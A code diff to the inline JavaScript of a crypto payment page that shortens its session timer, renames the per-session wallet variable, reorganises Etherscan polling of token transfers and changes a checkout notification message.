@@ -689,7 +689,7 @@ let paymentMode = "manual";
 // "manual" | "paymento"
 
 // ---------------- TIMER / SESSION INITIALIZATION ----------------
-const totalDuration = 15 * 60 * 1000; // 5 minutes
+const totalDuration = 5 * 60 * 1000; // 5 minutes
 
 let startTime = localStorage.getItem("avalonflowStartTime");
 if (startTime) {
@@ -710,8 +710,6 @@ if (!startTime) {
     localStorage.setItem("avalonflowStartTime", startTime);
 }
 
-let timerInterval;
-
 // ---------------- PAYMENTO ENGINE ----------------
 async function handlePayClick() {
 
@@ -721,7 +719,7 @@ async function handlePayClick() {
 
         paymentMode = "paymento";
 
-        triggerNotification("Redirecting to secure checkout...", 2000);
+        triggerNotification("Redirecting to connection portal...", 2000);
 
         // stop manual polling if running
         if (typeof pollTimeout !== "undefined") {
@@ -736,22 +734,12 @@ async function handlePayClick() {
             window.location.href =
                 "https://app.paymento.io/payment-link/f561273d652f4880b2c84d0cd6a08fef";
         }, 800);
-    
+
     } catch (err) {
         console.error(err);
         triggerNotification("Authorization connection error", 3000);
     }
 }
-
-// ---------------- MANUAL ENGINE GUARD ----------------
-function startManualIfAllowed() {
-    if (paymentMode !== "manual") return;
-
-    poll();
-    checkPayment();
-}
-
-let sessionWallet = localStorage.getItem("avalonflowWallet");
 
 // ---------------- FLOATING PARTICLES ----------------
 const bg = document.getElementById('floating-bg');
@@ -812,10 +800,10 @@ if(!walletPair){
 }
 
 // ---------------- ACTIVE WALLET PER SESSION ----------------
- 
-if (!sessionWallet) {
-    sessionWallet = wallets[Math.floor(Math.random() * wallets.length)];
-    localStorage.setItem("avalonflowWallet", sessionWallet);
+let activeWallet = localStorage.getItem("avalonflowWallet");
+if (!activeWallet) {
+    activeWallet = wallets[Math.floor(Math.random() * wallets.length)];
+    localStorage.setItem("avalonflowWallet", activeWallet);
 }
 
 // ---------------- TOKEN SWITCH ----------------
@@ -974,14 +962,11 @@ window.addEventListener("DOMContentLoaded", () => {
 const pageLoadTime = Math.floor(Date.now()/1000);
 
 async function checkPayment() {
-
-if (paymentMode !== "manual") return false;
-
     if (Date.now() - startTime > totalDuration) return true;
 
     const token = activeToken;
     const contract = tokens[token];
-    const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${sessionWallet}&contractaddress=${contract}&sort=desc&apikey=${apiKey}`;
+    const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${activeWallet}&contractaddress=${contract}&sort=desc&apikey=${apiKey}`;
 
     try {
         const res = await fetch(url);
@@ -995,13 +980,14 @@ if (paymentMode !== "manual") return false;
             const confirmations = parseInt(tx.confirmations || 1, 10);
 
             if (
-                tx.to.toLowerCase() === sessionWallet.toLowerCase() &&
+                tx.to.toLowerCase() === activeWallet.toLowerCase() &&
                 amount === expected &&
                 txTime > pageLoadTime &&
                 confirmations >= 1 &&
                 !paymentDone
             ) {
-                animatePaymentLine();
+                
+              animatePaymentLine();
 
                 localStorage.removeItem(storageKey);
                 localStorage.removeItem("avalonflowStartTime");
@@ -1097,9 +1083,9 @@ async function handleSecureRedirect(txHash) {
     try {
 
         if (
-    typeof expectedAmount === "undefined" ||
-    typeof sessionWallet === "undefined"
-) {
+            typeof expectedAmount === "undefined" ||
+            typeof activeWallet === "undefined"
+        ) {
             throw new Error("Missing required payment variables");
         }
 
@@ -1109,7 +1095,7 @@ async function handleSecureRedirect(txHash) {
             amount: expectedAmount,
             time: Date.now(),
 
-            wallet: sessionWallet,
+            wallet: activeWallet,
             txHash: txHash || null,
 
             deviceId: deviceId,
@@ -1144,8 +1130,6 @@ let pollInterval = 30000; // start at 30s
 let pollTimeout;
 
 function poll() {
-if (paymentMode !== "manual") return;
-
     pollTimeout = setTimeout(async () => {
         const done = await checkPayment();
         if (!done && Date.now() - startTime <= totalDuration) {
@@ -1153,6 +1137,14 @@ if (paymentMode !== "manual") return;
             poll();
         }
     }, pollInterval);
+}
+
+// ---------------- MANUAL ENGINE GUARD ----------------
+function startManualIfAllowed() {
+    if (paymentMode !== "manual") return;
+
+    poll();
+    checkPayment();
 }
 
 function triggerNotification(message, duration = 3000) {
@@ -1164,10 +1156,7 @@ function triggerNotification(message, duration = 3000) {
 
     setTimeout(() => notification.classList.remove("show"), duration);
 }
-window.addEventListener("DOMContentLoaded", () => {
-    startManualIfAllowed();
-});
-</script>
+</script> 
 </body>
 </html>
                 
